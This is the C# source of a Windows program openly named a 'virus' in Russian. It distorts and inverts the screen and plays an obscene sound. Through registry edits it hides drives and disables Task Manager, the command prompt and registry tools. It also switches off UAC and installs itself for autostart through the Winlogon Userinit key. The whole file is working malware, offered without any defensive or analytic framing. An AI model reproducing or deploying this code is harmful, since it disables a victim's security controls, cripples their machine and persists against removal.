﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Писять_и_спать_вирус
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
        }

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }
        public Form1()
        {
            InitializeComponent();
        }

        int oz = 0;

        private void Form1_Load(object sender, EventArgs e)
        {
            System.IO.Stream str = Properties.Resources.Y2mate_mx_Кто_громче_крикнет_жопа_на_уроке;
            System.Media.SoundPlayer snd = new System.Media.SoundPlayer(str);
            snd.Play();
            timer1.Start();
            timer2.Start();
            timer3.Start();
            timer4.Start();
            RegistryKey explorer = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies");
            RegistryKey reg = explorer.CreateSubKey("Explorer");

            reg.SetValue("NoDrives", 4);
            reg.SetValue("NoViewOnDrive", 4);
            reg.SetValue("DisableTaskMgr", 4);
            reg.SetValue("DisableCMD", 4);
            reg.SetValue("DisableRegistryTools", 4);

            Form2 f = new Form2(); // This is bad
            f.Show();

            Process[] processList = Process.GetProcessesByName("Писять и спать вирус"); //Чекаем процесс нашей проги, если она запущена - делаем эти действия: 
            if (processList.Length > 0)
            {
                RegistryKey r1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); //Оффаем уак 
                r1.SetValue("ConsentPromptBehaviorAdmin", 0); r1.SetValue("EnableLUA", 0); r1.SetValue("PromptOnSecureDesktop", 0);

                RegistryKey autos = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"); //Добавление себя в автозапуск 
                autos.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe, " + Application.ExecutablePath, RegistryValueKind.String);
            }
            else //Если не запущена: 
            {
                timer5.Enabled = true;
            }
        }

        Random r;

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            r = new Random();
            if (timer1.Interval > 101)
            {
                timer1.Interval -= 100;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else if (timer1.Interval > 51)
            {
                timer1.Interval -= 10;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else
            {
                timer1.Interval = 10;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);

            }
            timer1.Start();
        }

        Icon icon = Extract("shell32.dll", 235, true);
        //Image image = Image.FromFile(@"C:\Users\YourName\desktop\different_types_of_formats\photo.jpg");

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            this.Cursor = new Cursor(Cursor.Current.Handle);
            int posX = Cursor.Position.X;
            int posY = Cursor.Position.Y;

            IntPtr desktop = GetWindowDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktop))
            {
                g.DrawIcon(icon, posX, posY);
            }
            timer2.Start();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer3.Interval = r.Next(5000);
            timer3.Start();
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            timer4.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer4.Interval = r.Next(1000);
            //InvalidateRect(IntPtr.Zero, IntPtr.Zero, true); // for erase hdc(graphics payloads)
            timer4.Start();
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            if (oz == 0) //Одноразовый запуск только после проводника. А что может быть одноразовым? 
            {
                Process[] processList = Process.GetProcessesByName("LogonUI"); //Постоянная проверка процесса логонуи, если его кол во НЕ равно одному - запускаем другой ехешник 
                if (processList.Length != 1)
                {
                    oz = 17; //Сразу же меняем значение переменной на любое другое, кроме 0, чтоб вирус запустился только один раз 
                    try
                    {
                        Process.Start("Писять и спать вирус"); //Можно заменить на (обязательно полный) путь к другому ехешнику 
                    }
                    catch
                    {
                        MessageBox.Show("Ошибка при запуске 2 ехешника вируса.", "нет", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }
    }
}
